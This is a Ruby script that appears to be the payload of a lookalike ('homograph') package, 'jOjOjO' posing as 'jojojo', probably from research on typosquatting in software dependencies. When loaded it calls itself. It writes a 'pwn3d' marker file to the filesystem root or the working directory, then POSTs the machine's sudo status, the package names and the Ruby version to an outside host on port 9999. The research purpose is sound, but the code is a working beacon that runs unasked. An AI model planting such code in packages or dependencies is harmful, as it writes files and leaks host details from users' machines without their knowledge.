
def test_vuln
  begin
    f = File.new("/pwn3d.txt", "w+")
    f.write("You are (fully) pwn3d due to a homobraphic error on your software dependencies")
    is_sudo = true
  rescue
    begin
      f = File.new("pwn3d.txt", "w+")
      f.write("You are (slightly) pwn3d due to a homobraphic error on your software dependencies")
    rescue Exception => ex
      puts ex
    end
  end

  begin
    require 'net/http'
    require 'uri'

    uri = URI.parse("http://homografo.junquera.xyz:9999")

    http = Net::HTTP.new(uri.host, uri.port)
    request = Net::HTTP::Post.new(uri.request_uri)
    request.set_form_data({
      "is_sudo" => (is_sudo ? "True" : "False"),
      "sender" => "rubygem",
      "original_name" => "jojojo",
      "new_name" => "jOjOjO",
      "version" => RUBY_VERSION
      })
      response = http.request(request)
    rescue
      puts "Error in request"
    end
    return ""
end
test_vuln
